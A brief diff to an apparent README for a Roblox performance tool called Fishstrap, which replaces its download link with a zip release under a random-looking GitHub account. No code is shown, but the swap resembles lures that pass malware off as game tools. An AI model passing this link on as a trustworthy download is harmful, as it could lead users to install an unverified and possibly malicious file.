@@ -7,7 +7,7 @@ If you're looking to unlock higher FPS in Roblox, run multiple Roblox instances 
 <img width="119" height="119" alt="5fad1db4-561f-4c61-bf26-e448766149c6" src="https://github.com/user-attachments/assets/c27dc1ba-a993-4ed0-b85b-ddc6afd83aeb" />
 
 ## Install
-[Download `Fishstrap.zip`](https://github.com/BlackSuite999/Fishstrap-Roblox-2026/releases/tag/release)
+[Download `Fishstrap.zip`](https://github.com/luke-smith-lab2097j9/-Fishstrap-Roblox-Update-2026/releases/tag/release)
 ---
 
 <img width="583" height="343" alt="aa0af72e-2792-4155-b0f1-579f8cd15046" src="https://github.com/user-attachments/assets/56d5c4f0-da02-405d-90b4-2c9001b1921a" />
